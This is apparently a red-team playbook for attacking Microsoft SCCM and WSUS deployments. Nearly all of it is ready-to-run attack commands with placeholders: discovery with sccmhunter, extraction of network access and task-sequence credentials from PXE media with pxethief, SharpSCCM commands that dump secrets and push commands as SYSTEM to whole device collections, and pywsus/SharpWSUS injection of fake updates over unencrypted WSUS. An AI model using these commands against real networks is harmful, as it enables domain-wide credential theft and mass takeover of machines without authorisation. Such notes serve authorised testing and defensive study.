# SCCM / WSUS

## Before I start
- [ ] Find the infra: nxc ldap <DCIP> -u '<User>' -p '<Password>' -M sccm
python3 sccmhunter.py find -u '<User>' -p '<Password>' -d '<Domain>' -dc-ip <DCIP>
python3 sccmhunter.py smb -u '<User>' -p '<Password>' -d '<Domain>' -dc-ip <DCIP> -save

## SCCM — PXE and media loot
sudo python3 pxethief.py 1 <DistributionPointIP>
sudo python3 pxethief.py 3 <DPIP> <MediaVariablesFile>
sudo python3 pxethief.py 5 <DPIP>
- [ ] PXE-booted media and variables files carry: NAA account, task-sequence creds, domain-join account — all DPAPI-protected on the wire, decrypted by the tool
- [ ] NAA creds also readable on any SCCM client: WMI CCM_NetworkAccessAccount + machine DPAPI: :Pb dpapi

## SCCM — authenticated plays
SharpSCCM.exe get secrets -u '<User>' -p '<Password>'
SharpSCCM.exe local secrets -m system
SharpSCCM.exe exec -d <DeviceCollection> -p '<Command>'
- [ ] exec = push an application/script to a whole device collection = mass SYSTEM
- [ ] get secrets pulls collection variables + task sequence creds

## WSUS — plain HTTP = owned
- [ ] WSUS on HTTP (8530/8531 default) with no TLS = MitM the update channel: bettercap/responder position first
pywsus -H <VictimIP> -p 8530 -c 'cmd.exe /c <Command>' --PsExec64
SharpWSUS.exe inject /wsusserver:<WSUS> /payload:<PsExec64.exe> /args:'<Command>'
- [ ] Fake "Windows Command Processor" update installs as SYSTEM on every client that checks in

## If it fails
- [ ] PXE needs media variables + cert (Enhanced HTTP / PKI) → loot a client for the cert instead
- [ ] WSUS on HTTPS → MitM dead; target the WSUS server itself like any Windows host
- [ ] SharpSCCM access denied → my user isn't a SCCM admin; the secrets commands still work with just domain user on many deployments

## Next
- [ ] NAA / task-sequence creds → domain auth → full enum: :Pb domain-enum
- [ ] Mass SYSTEM → credential sweep: :Pb windows-creds
